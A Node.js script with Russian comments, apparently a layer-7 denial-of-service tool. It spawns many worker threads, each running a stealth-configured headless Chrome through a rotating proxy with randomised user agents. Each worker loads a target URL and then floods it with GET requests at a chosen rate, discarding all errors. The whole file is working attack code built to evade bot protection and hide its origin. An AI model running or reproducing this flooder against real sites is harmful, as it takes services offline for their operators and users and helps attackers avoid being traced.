const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const fs = require('fs');
const { Worker, isMainThread, workerData } = require('worker_threads');

// Конфигурация
const CHROME_PATH = '/usr/bin/google-chrome';
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
];

puppeteer.use(StealthPlugin());

async function runWorker({ targetUrl, proxy, rate }) {
    const browser = await puppeteer.launch({
        executablePath: CHROME_PATH,
        headless: true,
        args: [
            `--proxy-server=${proxy}`,
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            '--disable-gpu',
            '--ignore-certificate-errors'
        ],
        ignoreHTTPSErrors: true
    });

    try {
        const page = await browser.newPage();
        
        // Настройка до создания страницы
        await page.setExtraHTTPHeaders({
            'Accept-Language': 'en-US,en;q=0.9'
        });

        // Установка User-Agent после создания страницы
        const userAgent = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
        await page.setUserAgent(userAgent);

        // Навигация с таймаутом
        await page.goto(targetUrl, {
            waitUntil: 'networkidle2',
            timeout: 60000
        });

        // Проверка успешной загрузки
        const pageTitle = await page.title();
        console.log(`Успешно загружено: ${pageTitle}`);

        // Флуд запросами
        const proxyConfig = {
            host: proxy.split(':')[0],
            port: parseInt(proxy.split(':')[1])
        };

        setInterval(() => {
            axios.get(targetUrl, {
                proxy: proxyConfig,
                headers: { 'User-Agent': userAgent }
            }).catch(() => {});
        }, 1000 / rate);

    } catch (error) {
        console.error(`Ошибка в потоке: ${error.message}`);
        await browser.close();
    }
}

if (isMainThread) {
    const targetUrl = process.argv[2];
    const threads = parseInt(process.argv[3]);
    const proxyFile = process.argv[4];
    const rate = parseInt(process.argv[5]);

    const proxies = fs.readFileSync(proxyFile, 'utf-8')
        .split('\n')
        .filter(Boolean)
        .map(p => p.trim());

    for (let i = 0; i < threads; i++) {
        new Worker(__filename, {
            workerData: {
                targetUrl,
                proxy: proxies[i % proxies.length],
                rate
            }
        });
    }
} else {
    runWorker(workerData).catch(console.error);
}
